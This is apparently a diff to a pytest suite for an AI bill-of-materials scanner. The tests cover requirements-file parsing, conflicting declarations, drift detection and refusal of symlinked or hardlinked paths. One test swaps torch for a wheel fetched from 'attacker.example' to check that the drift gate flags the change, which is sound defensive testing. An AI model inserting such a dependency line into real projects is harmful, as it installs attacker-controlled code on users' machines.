@@ -79,7 +79,11 @@ def test_registry_keeps_one_component_per_package_across_requirements_files(tmp_
     assert by_name["openai"].risks == []
     assert by_name["torch"].version == "==2.3.0"
     assert [r.detail for r in by_name["torch"].risks] == [
-        "PyPI package 'torch' is declared differently in another requirements file."
+        "PyPI package 'torch' is declared differently in another dependency manifest."
+    ]
+    assert by_name["torch"].properties["declarations"] == [
+        "requirements-lock.txt: torch>=2",
+        "requirements.txt: torch==2.3.0",
     ]
     scanned = CliRunner().invoke(
         main, ["scan", str(tmp_path), "--no-project-policy", "-o", str(tmp_path / "bom.json")]
@@ -100,6 +104,11 @@ def test_registry_keeps_one_component_per_package_across_requirements_files(tmp_
         ("--cons=deps/constraints.txt\n", ["included"]),
         ("-rrequirements-extra.txt\n", []),
         ("--index-url https://pypi.org/simple\nopenai==1.3.0  \t# pinned\n", []),
+        ("--index-url https://pypi.org/simple -r ../shared/ai.txt\n", ["included"]),
+        ("--pre -e ./localpkg\n", ["unsupported"]),
+        ("--no-binary :all: --constraint deps/c.txt\n", ["included"]),
+        ('-r "requirements-extra.txt"\n', []),
+        ("-r 'unbalanced\n", ["unsupported"]),
     ],
 )
 def test_registry_records_requirement_forms_it_cannot_collect(tmp_path, content, excluded):
@@ -114,6 +123,51 @@ def test_registry_records_requirement_forms_it_cannot_collect(tmp_path, content,
     assert result.scan_failures == []
     if not excluded:
         assert "openai" in {c.name for c in result.components} or "-r" in content
+
+
+def test_a_changed_second_declaration_reaches_the_drift_gate(tmp_path):
+    project = tmp_path / "project"
+    project.mkdir()
+    (project / "AGENTS.md").write_text("Keep receipts.")
+    (project / "requirements.txt").write_text("torch==2.3.0+cpu\n")
+    gpu = project / "requirements-gpu.txt"
+    gpu.write_text("torch==2.3.0+cu121\n")
+    runner = CliRunner()
+    args = ["scan", str(project), "--no-project-policy", "--report-only", "-o"]
+    assert runner.invoke(main, [*args, str(tmp_path / "before.json")]).exit_code == 0
+    gpu.write_text("torch @ https://attacker.example/torch-2.3.0-py3-none-any.whl\n")
+    assert runner.invoke(main, [*args, str(tmp_path / "after.json")]).exit_code == 0
+    drift = runner.invoke(
+        main,
+        ["diff", "--fail-on-alert", str(tmp_path / "before.json"), str(tmp_path / "after.json")],
+    )
+    assert drift.exit_code != 0, drift.output
+    assert "registry:pypi/torch" in drift.output or "torch" in drift.output
+
+
+def test_vex_refuses_a_second_name_for_its_input(tmp_path, monkeypatch):
+    inventory = tmp_path / "inv.json"
+    inventory.write_text(AIBOM().to_json())
+    original = inventory.read_bytes()
+    (tmp_path / "alias.json").hardlink_to(inventory)
+    monkeypatch.chdir(tmp_path)
+    result = CliRunner().invoke(main, ["vex", "inv.json", "-o", "alias.json"])
+    assert result.exit_code == 2 and "must not overwrite the source inventory" in result.output
+    assert inventory.read_bytes() == original
+
+
+def test_init_refuses_a_symlinked_or_looping_path_without_a_traceback(tmp_path):
+    (tmp_path / "real").mkdir()
+    (tmp_path / "link").symlink_to(tmp_path / "real", target_is_directory=True)
+    (tmp_path / "loop").symlink_to(tmp_path / "loop")
+    runner = CliRunner()
+    for path in ("link", "loop"):
+        result = runner.invoke(main, ["init", "--path", str(tmp_path / path)])
+        assert result.exit_code == 1, result.output
+        assert result.exception.__class__ is SystemExit
+    assert not (tmp_path / "real" / ".nexus-symbiote.yaml").exists()
+    created = runner.invoke(main, ["init", "--path", str(tmp_path / "real")])
+    assert created.exit_code == 0 and (tmp_path / "real" / ".nexus-symbiote.yaml").exists()
 
 
 def test_output_parent_references_follow_the_kernel_and_never_a_link(tmp_path, monkeypatch):
